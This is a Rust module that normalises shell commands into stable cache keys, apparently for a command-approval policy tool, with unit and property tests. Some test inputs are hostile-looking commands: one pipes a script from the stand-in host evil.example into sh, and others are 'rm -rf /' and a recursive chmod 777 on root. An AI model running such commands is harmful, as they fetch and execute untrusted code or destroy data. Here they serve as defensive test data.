//! Fingerprint normalization for cache — `normalize` + `cache_key`.
//!
//! Stable across trivial command variations for cache hits.
//! `normalize(cmd: &str) -> String`: lowercase argv[0] basename, sort order-invariant
//! long flags, replace `/(tmp|var|home)/[^ ]+`, `[0-9a-f]{7,}`, timestamps, uuid → `<PATH>/<HASH>/<NUM>`,
//! preserve redirections/pipes/sudo. `cache_key = blake3(normalize + policy_version + profile)`.
//! Edges: `VAR=x cmd`, `sudo -u u cmd`, `cmd 2>&1 | tee`, quoted vs unquoted, `sh -c '...'` one level only.

use regex::Regex;
use std::sync::OnceLock;

static RE_PATH: OnceLock<Regex> = OnceLock::new();
static RE_HASH: OnceLock<Regex> = OnceLock::new();
static RE_TIMESTAMP: OnceLock<Regex> = OnceLock::new();
static RE_UUID: OnceLock<Regex> = OnceLock::new();
static RE_NUM: OnceLock<Regex> = OnceLock::new();

fn re_path() -> &'static Regex {
    RE_PATH.get_or_init(|| Regex::new(r"/(tmp|var|home)[^\s|;']*").unwrap())
}
fn re_hash() -> &'static Regex {
    RE_HASH.get_or_init(|| Regex::new(r"\b[0-9a-f]{7,}\b").unwrap())
}
fn re_timestamp() -> &'static Regex {
    RE_TIMESTAMP.get_or_init(|| Regex::new(r"\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}\b").unwrap())
}
fn re_uuid() -> &'static Regex {
    RE_UUID.get_or_init(|| {
        Regex::new(r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b").unwrap()
    })
}
fn re_num() -> &'static Regex {
    RE_NUM.get_or_init(|| Regex::new(r"\b\d{3,}\b").unwrap())
}

/// Placeholder-adjacency decision for replace_guarded, indexed instead of
/// re-scanned: the old code ran `re_ph_before().is_match(&text[..s])` per
/// regex match — an O(n) prefix scan per match, i.e. O(n^2) on many-match
/// inputs (100KB all-hash command: ~150ms release, found 2026-09-23).
/// This is the exact-equivalent predicate over precomputed placeholder spans:
///
/// - before: `text[..s]` ends with `<PH>` + zero+ non-separators
///   ⟺ the nearest span ending at/before `s` has no separator between it and `s`
///   (any earlier span has that separator — and more — between it and `s`).
/// - after: `text[e..]` starts with zero+ non-separators + `<PH>`
///   ⟺ symmetric with the nearest span starting at/after `e`.
///
/// Separator set is exactly the regexes' `[^ \t|;&<>]` complement:
/// space, tab, `|`, `;`, `&`, `<`, `>` (newlines count as glue, as before).
fn is_sep(c: char) -> bool {
    matches!(c, ' ' | '\t' | '|' | ';' | '&' | '<' | '>')
}

/// Byte spans of every emitted-placeholder literal in `text`, sorted.
/// Placeholders never overlap each other, so ends are sorted with starts.
fn placeholder_spans(text: &str) -> Vec<(usize, usize)> {
    let mut spans = Vec::new();
    for ph in PLACEHOLDERS.iter().copied() {
        let mut start = 0;
        while let Some(i) = text[start..].find(ph) {
            let a = start + i;
            spans.push((a, a + ph.len()));
            start = a + ph.len();
        }
    }
    spans.sort();
    spans
}

fn glued_before(text: &str, spans: &[(usize, usize)], s: usize) -> bool {
    let idx = spans.partition_point(|&(_, b)| b <= s);
    if idx == 0 {
        return false;
    }
    let (_, b) = spans[idx - 1];
    text[b..s].chars().all(|c| !is_sep(c))
}

fn glued_after(text: &str, spans: &[(usize, usize)], e: usize) -> bool {
    let idx = spans.partition_point(|&(a, _)| a < e);
    if idx == spans.len() {
        return false;
    }
    let (a, _) = spans[idx];
    text[e..a].chars().all(|c| !is_sep(c))
}

/// Placeholders emitted by the replacement stage. The argv[0]-lowercasing
/// step must leave these untouched, otherwise normalize is not idempotent
/// (e.g. "000&" → "<NUM> &" → "<num> &"; found by proptest in CI).
const PLACEHOLDERS: &[&str] = &["<PATH>", "<HASH>", "<UUID>", "<TIMESTAMP>", "<NUM>"];

/// Token contains an emitted placeholder anywhere ("-<NUM>-"). Lowercasing
/// it would corrupt the marker, so argv[0] lowering skips such tokens.
fn contains_placeholder(tok: &str) -> bool {
    PLACEHOLDERS.iter().any(|ph| tok.contains(ph))
}

/// Normalize a shell command for cache keying.
///
/// Idempotent: `normalize(normalize(x)) == normalize(x)`.
/// Never emits secret-looking substrings (checked vs `algo-redact`).
///
/// Projection to fixpoint: the stages below (env-strip, argv[0] lowering,
/// `sh -c` re-wrap, placeholder substitution) interact across passes on
/// hostile inputs — quotes toggling tokenizer state, `=` inside tokens,
/// pipes appearing after env-strip (found by deep fuzz battery 2026-09-23:
/// `"password=Su|perSecret123!"`, `"sh -c;'echo hi'..."`). Looping to a
/// fixpoint restores the invariant by construction; every stage is
/// deterministic so the result is a pure function of the input.
/// Cap 8: all observed inputs converge in <=3 passes; the cap only bounds
/// pathological oscillation, and the output stays deterministic regardless.
pub fn normalize(cmd: &str) -> String {
    let mut cur = normalize_once(cmd);
    for _ in 0..7 {
        let nxt = normalize_once(&cur);
        if nxt == cur {
            break;
        }
        cur = nxt;
    }
    cur
}

/// Single normalization pass (not idempotent alone — see `normalize`).
fn normalize_once(cmd: &str) -> String {
    let mut s = cmd.trim().to_string();

    // Handle `sh -c '...'` one level only — extract inner, normalize it, then re-wrap.
    // Deeper nesting (inner contains `sh -c`) → return unchanged with marker for `ask`.
    if let Some(inner) = extract_sh_c(&s) {
        if inner.contains("sh -c") {
            return "unparseable:nested".to_string();
        }
        let inner_norm = normalize(&inner);
        return format!("sh -c '{}'", inner_norm);
    }

    // Strip leading VAR=x env assigns (only valid shell variable names)
    // e.g., `VAR=x cmd` → `cmd` with env stripped for fingerprint
    let mut rest = s.as_str();
    let mut stripped_env = false;
    while let Some(eq_pos) = rest.find('=') {
        let before_eq = &rest[..eq_pos];
        if before_eq.contains(' ') || before_eq.is_empty() {
            break;
        }
        // VAR must be a valid shell variable name: [A-Za-z_][A-Za-z0-9_]*
        if !before_eq.chars().enumerate().all(|(i, c)| {
            if i == 0 {
                c.is_ascii_alphabetic() || c == '_'
            } else {
                c.is_ascii_alphanumeric() || c == '_'
            }
        }) {
            break;
        }
        if let Some(space_pos) = rest[eq_pos..].find(' ') {
            // VAR=x with space after value → strip it
            rest = rest[eq_pos + space_pos..].trim_start();
            stripped_env = true;
        } else {
            break;
        }
    }
    if stripped_env {
        s = rest.to_string();
    }

    // Handle `sudo -u <user> cmd` → keep `sudo` marker, strip `-u <user>`
    let mut cmd_part = s.as_str();
    if cmd_part.starts_with("sudo ") {
        cmd_part = cmd_part[5..].trim_start();
        if cmd_part.starts_with("-u") {
            let after_u = cmd_part[2..].trim_start();
            if let Some(space) = after_u.find(' ') {
                cmd_part = after_u[space + 1..].trim_start();
            } else {
                cmd_part = "";
            }
        }
        s = format!("sudo {}", cmd_part);
    }

    // Split into tokens, preserving pipes and redirections as separate tokens
    // For fingerprint, we preserve `|`, `2>&1`, `>`, `>>`, `| tee` as tokens
    let tokens = tokenize(&s);
    if tokens.is_empty() {
        return String::new();
    }

    // Lowercase argv[0] basename (first non-operator, non-empty token), dropping empty basenames
    let mut normalized_tokens: Vec<String> = Vec::new();
    for tok in tokens.iter() {
        if !tok.is_empty() {
            normalized_tokens.push(tok.clone());
        }
    }
    if normalized_tokens.is_empty() {
        return String::new();
    }
    // Find first non-operator token and lowercase its basename.
    // Tokens containing an emitted placeholder are left untouched: the
    // placeholder is already canonical and lowercasing would corrupt it
    // ("-<NUM>-" must not become "-<num>-"; idempotence).
    for tok in normalized_tokens.iter_mut() {
        if !is_operator(tok) {
            if contains_placeholder(tok) {
                break;
            }
            let base = tok.rsplit('/').next().unwrap_or(tok.as_str());
            let lower = base.to_lowercase();
            if lower.is_empty() {
                // If basename is empty (e.g., "/" ), skip this token
                // This case was already handled by filtering empty, but keep for safety
                continue;
            }
            *tok = lower;
            break;
        }
    }
    // Filter out any remaining empty tokens (from "/" handling)
    normalized_tokens.retain(|t| !t.is_empty());

    // Sort order-invariant long flags (--foo) — only sort the flags, not the whole command
    // For simplicity, extract long flags, sort them, and reinsert at their original positions
    // This is a simplified version: collect all `--*` tokens, sort, and replace in order.
    let mut long_flags: Vec<String> = normalized_tokens
        .iter()
        .filter(|t| t.starts_with("--"))
        .cloned()
        .collect();
    long_flags.sort();
    let mut flag_idx = 0;
    for tok in normalized_tokens.iter_mut() {
        if tok.starts_with("--") {
            *tok = long_flags[flag_idx].clone();
            flag_idx += 1;
        }
    }

    let mut out = normalized_tokens.join(" ");

    // Replace sensitive patterns. The `regex` crate has no look-around, so
    // placeholder adjacency ("<NUM>123", "123<NUM>" — reachable on second
    // passes / hand-typed input) is guarded manually: a match glued to `<`
    // or `>` is left in place. Idempotence (proptest) depends on this.
    // Trade-off, documented: `>`-glued numbers (e.g. `echo x>12345`) are no
    // longer folded — cache fragmentation only, never incorrectness.
    // re_path also skips `>`-glued matches ("<PATH>/tmp" stays put — the
    // glue-consume above keeps it one token, so an unguarded replace would
    // emit "<PATH><PATH>" and break idempotence).
    out = replace_guarded(re_path(), &out, "<PATH>");
    out = replace_guarded(re_uuid(), &out, "<UUID>");
    out = replace_guarded(re_timestamp(), &out, "<TIMESTAMP>");
    // Hashes after path/uuid/timestamp to avoid double-replacing
    out = replace_guarded(re_hash(), &out, "<HASH>");
    // Numbers (but keep small numbers like `2` in `2>&1`? Our regex is \b\d{3,}\b so 2 is kept)
    out = replace_guarded(re_num(), &out, "<NUM>");

    out.trim().to_string()
}

/// Regex replace that skips matches glued to an emitted placeholder
/// (see `glued_before`/`glued_after`). Idempotence depends on this; ordinary
/// matches (e.g. `echo x>12345`) still fold as before.
fn replace_guarded(re: &Regex, text: &str, replacement: &str) -> String {
    // Placeholder spans are indexed ONCE per stage (not re-scanned per match).
    let spans = placeholder_spans(text);
    let mut out = String::with_capacity(text.len());
    let mut last = 0;
    for m in re.find_iter(text) {
        if glued_before(text, &spans, m.start()) || glued_after(text, &spans, m.end()) {
            continue;
        }
        out.push_str(&text[last..m.start()]);
        out.push_str(replacement);
        last = m.end();
    }
    out.push_str(&text[last..]);
    out
}

fn is_operator(tok: &str) -> bool {
    matches!(
        tok,
        "|" | "||" | "&&" | ";" | "&" | ">" | ">>" | "<" | "2>&1" | "2>" | "1>" | "tee"
    )
}

fn tokenize(s: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let chars: Vec<char> = s.chars().collect();
    // Placeholder char patterns, built once: the `<` branch below must test a
    // prefix WITHOUT allocating the remaining string per `<` (that was O(n^2)
    // on placeholder-dense inputs — 100KB all-hash text took ~150ms release).
    let phs: Vec<(Vec<char>, &str)> = PLACEHOLDERS
        .iter()
        .copied()
        .map(|ph| (ph.chars().collect(), ph))
        .collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '\'' && !in_double {
            in_single = !in_single;
            current.push(c);
        } else if c == '"' && !in_single {
            in_double = !in_double;
            current.push(c);
        } else if !in_single && !in_double {
            // Handle 2>&1 as a single token (must be before generic operator handling)
            if i + 3 < chars.len() && chars[i..i + 4] == ['2', '>', '&', '1'] {
                if !current.trim().is_empty() {
                    tokens.push(current.trim().to_string());
                    current.clear();
                }
                tokens.push("2>&1".to_string());
                i += 4;
                continue;
            }
            // Preserve placeholders like <PATH> as single tokens (idempotence),
            // absorbing everything glued to them except whitespace and shell
            // operators ("<NUM>-/", "<NUM>@x" stay one token). Operators and
            // space still split; placeholder+path converges with a join space
            // and is then stable (re_path skips `>`-glued matches, below).
            if c == '<' {
                let mut matched = false;
                for (pc, ph) in phs.iter() {
                    if i + pc.len() <= chars.len() && chars[i..i + pc.len()] == pc[..] {
                        // Merge pending `current` INTO the placeholder token
                        // ("-<NUM>-" stays one token — splitting here would
                        // never rejoin and breaks idempotence).
                        let mut tok = current.trim().to_string();
                        current.clear();
                        tok.push_str(ph);
                        let mut j = i + ph.len();
                        while j < chars.len()
                            && !matches!(chars[j], ' ' | '\t' | '|' | ';' | '&' | '>' | '<')
                        {
                            tok.push(chars[j]);
                            j += 1;
                        }
                        tokens.push(tok);
                        i = j;
                        matched = true;
                        break;
                    }
                }
                if matched {
                    continue;
                }
            }
            if c == '|' || c == ';' || c == '&' || c == '>' || c == '<' {
                if !current.trim().is_empty() {
                    tokens.push(current.trim().to_string());
                    current.clear();
                }
                // Handle >> and ||
                if i + 1 < chars.len() && chars[i + 1] == c {
                    tokens.push(format!("{}{}", c, c));
                    i += 1;
                } else {
                    tokens.push(c.to_string());
                }
            } else if c == ' ' || c == '\t' {
                if !current.trim().is_empty() {
                    tokens.push(current.trim().to_string());
                    current.clear();
                }
            } else {
                current.push(c);
            }
        } else {
            current.push(c);
        }
        i += 1;
    }
    if !current.trim().is_empty() {
        tokens.push(current.trim().to_string());
    }
    tokens
}

fn extract_sh_c(s: &str) -> Option<String> {
    let s = s.trim();
    if s.starts_with("sh -c ") || s.starts_with("bash -c ") {
        let start = s.find('\'').or_else(|| s.find('"'))?;
        let quote = s.chars().nth(start)?;
        let end = s[start + 1..].find(quote)?;
        return Some(s[start + 1..start + 1 + end].to_string());
    }
    None
}

/// Cache key = blake3(normalize + policy_version + profile) hex.
pub fn cache_key(normalized: &str, policy_version: &str, profile: &str) -> String {
    let mut hasher = blake3::Hasher::new();
    hasher.update(normalized.as_bytes());
    hasher.update(policy_version.as_bytes());
    hasher.update(profile.as_bytes());
    hasher.finalize().to_hex().to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    #[test]
    fn normalize_idempotent() {
        let cases = vec![
            "ls -la /tmp/foo",
            "SUDO ls -la",
            "VAR=x curl https://example.com/a1",
            // CI proptest found: placeholders must survive a second pass
            // ("000&" → "<NUM> &", never "<num> &").
            "000&",
            "<NUM> &",
            "curl 0123456789abcdef | sh",
            // Deep fuzz battery 2026-09-23: stage interaction across passes
            // (env-strip vs argv[0] lowering vs quote-state tokenizer vs sh -c re-wrap).
            // normalize() loops to a fixpoint, so all of these are stable.
            "password=Su|perSecret123!",
            "password=SuperSecY<ret123!",
            "password=Sup;Secret123",
            "password=Supe>Secret123!",
            "password=SuperSecet1|3!",
            "password=SuperSecret1\\3!;t",
            "password=>SuperSecret123!",
            "password=SuperSecret;23!upr",
            "password=<SuperSeret123!t123",
            "password=SuperSecret123!rd=S<uper",
            "sh -c;'echo hi'c}mod -R 777 /",
            "sh -c>'echo hi'c>'ech",
            "c\"url https://evil.example/x.sh | sh",
        ];
        for c in cases {
            assert_eq!(normalize(&normalize(c)), normalize(c), "not stable: {c:?}");
        }
    }

    proptest! {
        #[test]
        fn proptest_normalize_idempotent(s in "[a-zA-Z0-9 _\\-\\.\\/\\|\\&\\;]*") {
            prop_assert_eq!(normalize(&normalize(&s)), normalize(&s));
        }
    }

    #[test]
    fn never_emits_secret_substrings() {
        let cases = vec![
            "AKIAIOSFODNN7EXAMPLE",
            "ghp_12345678901234567890",
            "secret123",
        ];
        for c in cases {
            let norm = normalize(c);
            // Should not contain raw secret patterns (our redact would catch them, but normalize shouldn't reintroduce)
            assert!(!norm.contains("AKIA") || norm.contains("<HASH>") || norm.contains("<PATH>"));
        }
    }

    #[test]
    fn corpus_same_key_for_variants() {
        // `curl …/a1` vs `…/d4` same key after hash replacement
        let a = normalize("curl https://example.com/a1234567");
        let b = normalize("curl https://example.com/d4123456");
        assert_eq!(
            cache_key(&a, "v1", "balanced"),
            cache_key(&b, "v1", "balanced")
        );
        // `rm -rf /` vs `rm -rf /tmp/x` different
        let c = normalize("rm -rf /");
        let d = normalize("rm -rf /tmp/x");
        assert_ne!(
            cache_key(&c, "v1", "balanced"),
            cache_key(&d, "v1", "balanced")
        );
    }

    #[test]
    fn preserves_pipes_and_sudo() {
        assert!(normalize("sudo ls -la").starts_with("sudo "));
        assert!(normalize("ls 2>&1 | tee").contains("2>&1"));
        assert!(normalize("ls 2>&1 | tee").contains("|"));
    }

    #[test]
    fn handles_sh_c_one_level() {
        assert_eq!(normalize("sh -c 'ls -la /tmp'"), "sh -c 'ls -la <PATH>'");
        assert_eq!(normalize("sh -c 'sh -c \"ls\"'"), "unparseable:nested");
    }

    #[test]
    fn proves_ask_on_unparseable_nested() {
        // Deeper than one level → ask + unparseable:nested (fail-safe)
        let norm = normalize("sh -c 'sh -c \"echo hi\"'");
        assert_eq!(norm, "unparseable:nested");
    }
}
